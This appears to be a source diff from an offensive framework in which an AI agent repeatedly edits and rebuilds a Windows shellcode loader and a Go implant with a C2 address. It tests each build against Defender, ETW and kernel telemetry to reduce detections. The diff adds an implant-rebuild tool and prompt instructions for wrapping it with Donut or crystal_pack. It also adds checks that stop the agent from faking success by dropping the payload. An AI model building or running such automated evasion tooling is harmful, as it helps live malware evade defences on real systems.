@@ -32,6 +32,14 @@ const (
 	maxEvolveTurns      = 240
 	maxEvolveEdits      = 12
 	maxEvolveBuildLog   = 8 << 20
+	// minAgentShellcodeBytes rejects a tiny blob that no real Go agent could
+	// have produced. It catches a loader that drops the payload to reduce
+	// detections.
+	minAgentShellcodeBytes = 32 << 10
+	// A loader embeds the active shellcode. Requiring the artifact to be at
+	// least a quarter of it catches a build that removes the payload while
+	// allowing a producer that compresses the blob.
+	minArtifactShellcodeRatio = 4
 )
 
 // EvolveConfig drives an autonomous detection -> feedback -> edit -> rebuild
@@ -77,6 +85,34 @@ type EvolveConfig struct {
 	// BuildProducer overrides a shellcode-producer build. Production uses the
 	// same local module build path as the payload module.
 	BuildProducer func(moduleDir, module string, flags map[string]string) (string, error)
+	// BuildAgent rebuilds the Go agent with new generator flags. The loop
+	// worker wires this to the operator builder; tests may stub it.
+	BuildAgent func(AgentBuildOptions) (*AgentBuildResult, error)
+	// AgentType, AgentArch, and AgentCC are the generator defaults shown to the
+	// model and used by GenerateAgent when the model omits an override.
+	AgentType string
+	AgentArch string
+	AgentCC   string
+}
+
+// AgentBuildOptions describes one real agent rebuild. Only the Windows payload
+// types are accepted because loader_windows is x64 PE-only.
+type AgentBuildOptions struct {
+	Type      string
+	Arch      string
+	CCAddress string
+}
+
+// AgentBuildResult is the freshly generated agent artifact and its shellcode.
+// ArtifactPath is the EXE or DLL; ShellcodePath is the Donut/PICO blob the
+// loader embeds.
+type AgentBuildResult struct {
+	ArtifactPath  string
+	ShellcodePath string
+	Type          string
+	Arch          string
+	SHA256        string
+	Size          int64
 }
 
 // EvolveResult is the final answer plus the cycles the agent ran.
@@ -89,19 +125,36 @@ type EvolveResult struct {
 }
 
 type evolver struct {
-	cfg        EvolveConfig
-	loop       *Loop
-	db         *TelemetryDB
-	logf       func(logging.Class, string, ...any)
-	iter       int
-	edits      int
-	last       *Cycle
-	cycles     []Cycle
-	roots      *sourceRoots
-	shellcode  string
-	shellSeq   int
-	knowledge  *KnowledgeDB
-	lastAnswer map[string]any
+	cfg           EvolveConfig
+	loop          *Loop
+	db            *TelemetryDB
+	logf          func(logging.Class, string, ...any)
+	iter          int
+	edits         int
+	last          *Cycle
+	cycles        []Cycle
+	roots         *sourceRoots
+	shellcode     string
+	agentArtifact string
+	shellSeq      int
+	knowledge     *KnowledgeDB
+	lastAnswer    map[string]any
+}
+
+func (e *evolver) activeShellcode() string {
+	if strings.TrimSpace(e.shellcode) != "" {
+		return e.shellcode
+	}
+	return e.cfg.Shellcode
+}
+
+// payloadDir is the directory whose agent artifact and shellcode the producer
+// may read. GenerateAgent updates the artifact before a producer runs.
+func (e *evolver) payloadDir() string {
+	if strings.TrimSpace(e.agentArtifact) != "" {
+		return filepath.Dir(e.agentArtifact)
+	}
+	return filepath.Dir(e.activeShellcode())
 }
 
 func (e *evolver) log(format string, args ...any) {
@@ -336,6 +389,14 @@ declared options. The produced artifact becomes the shellcode for every later
 cycle; the cycle summary records its path. BuildShellcode validates options,
 forces the output under the detection store, and refuses files outside the
 operator payload directory.
+
+GenerateAgent rebuilds the Go agent, not just the wrapper. agent_type may be
+windows_executable or windows_dll; the result returns artifact_path without
+wrapping it. Use BuildShellcode producer=donut with input=artifact_path, or
+producer=crystal_pack with dll=artifact_path, to choose the shellcode wrapper.
+Java is installed for crystal_pack. The agent payload itself must remain: do
+not replace the shellcode with a smaller blob or build a loader that does not
+execute it.
 
 Use all telemetry. Defender verdicts are one input; the events table carries
 ETW, ETW-TI memory operations, kernel callbacks, ntdll hooks, PEB and loaded-DLL
@@ -586,6 +647,21 @@ type cycleSummary struct {
 	Note         string          `json:"note,omitempty"`
 }
 
+func ensurePayloadPreserved(shellcode string, artifact Artifact) error {
+	info, err := os.Stat(shellcode)
+	if err != nil {
+		return fmt.Errorf("active shellcode %q: %w", shellcode, err)
+	}
+	if info.Size() < minAgentShellcodeBytes {
+		return fmt.Errorf("active shellcode is only %d bytes; a real agent payload is larger", info.Size())
+	}
+	if artifact.Size < info.Size()/minArtifactShellcodeRatio {
+		return fmt.Errorf("artifact is %d bytes but the active shellcode is %d bytes; the build removed the agent payload",
+			artifact.Size, info.Size())
+	}
+	return nil
+}
+
 func (e *evolver) runCycle(ctx context.Context, note, mechanism string) (Cycle, error) {
 	iteration := e.iter + 1
 
@@ -593,10 +669,7 @@ func (e *evolver) runCycle(ctx context.Context, note, mechanism string) (Cycle, 
 		return Cycle{}, err
 	}
 
-	shellcode := e.shellcode
-	if strings.TrimSpace(shellcode) == "" {
-		shellcode = e.cfg.Shellcode
-	}
+	shellcode := e.activeShellcode()
 	flags := map[string]string{
 		"shellcode": shellcode,
 		"format":    e.cfg.Format,
@@ -632,6 +705,11 @@ func (e *evolver) runCycle(ctx context.Context, note, mechanism string) (Cycle, 
 	artifact, err := InspectArtifact(artifactPath)
 	if err != nil {
 		return Cycle{}, err
+	}
+	if strings.EqualFold(e.cfg.Module, "loader_windows") {
+		if err := ensurePayloadPreserved(shellcode, artifact); err != nil {
+			return Cycle{}, err
+		}
 	}
 	if err := e.loop.Store.RecordArtifact(e.cfg.Module, artifact); err != nil {
 		return Cycle{}, err
@@ -686,6 +764,9 @@ func (e *evolver) runCycle(ctx context.Context, note, mechanism string) (Cycle, 
 		}
 	}
 	feedback := BuildFeedback(run)
+	if dynamic && !run.Executed {
+		return Cycle{}, fmt.Errorf("dynamic stages were selected but the sandbox did not execute the artifact")
+	}
 	if err := e.linkEdits(ctx, iteration, run.Telemetry.PayloadID); err != nil {
 		e.logClass(logging.ClassError, "link edits: %v", err)
 	}
@@ -980,7 +1061,7 @@ func (e *evolver) hooks() *hook.Registry {
 		switch event.ToolName {
 		case "SourceList", "SourceRead", "SourceSearch", "TelemetryQuery",
 			"InspectFeedback", "Payloads", "ComparePayloads", "DetectionCycle", "EditSource",
-			"BuildShellcode", "RevertToPayload", "KnowledgeSearch", "KnowledgeRead":
+			"BuildShellcode", "GenerateAgent", "RevertToPayload", "KnowledgeSearch", "KnowledgeRead":
 			return hook.Result{}
 		}
 		return hook.Result{Decision: "block", Message: "tool is not part of the detection loop"}
@@ -1012,6 +1093,7 @@ func (e *evolver) tools() []tool.CoreTool {
 		e.comparePayloadsTool(),
 		e.editSourceTool(),
 		e.buildShellcodeTool(),
+		e.generateAgentTool(),
 		e.revertPayloadTool(),
 	}
 	if e.knowledge != nil {
@@ -1624,6 +1706,13 @@ Work loop:
    validated against the module's config.json; the output path is chosen by the
    host. A producer change is the right move when the signal is a signature or
    layout in the generated blob; a loader-only edit cannot remove it.
+   GenerateAgent rebuilds the Go agent itself with agent_type
+   windows_executable or windows_dll. Its artifact_path can be passed as the
+   dll option to BuildShellcode producer=crystal_pack; crystal_pack uses the
+   installed Java runtime and writes PICO shellcode. Changing the agent type or
+   producer must still execute the agent: do not shrink the active shellcode or
+   build a loader that skips the payload. The host rejects a cycle whose
+   artifact is too small to contain the active shellcode.
 4. Call DetectionCycle with the mechanism under test. It rebuilds from the
    current source and returns a bounded summary, the new payload key, the active
    shellcode, and the remaining cycle budget. Do not exceed the budget.
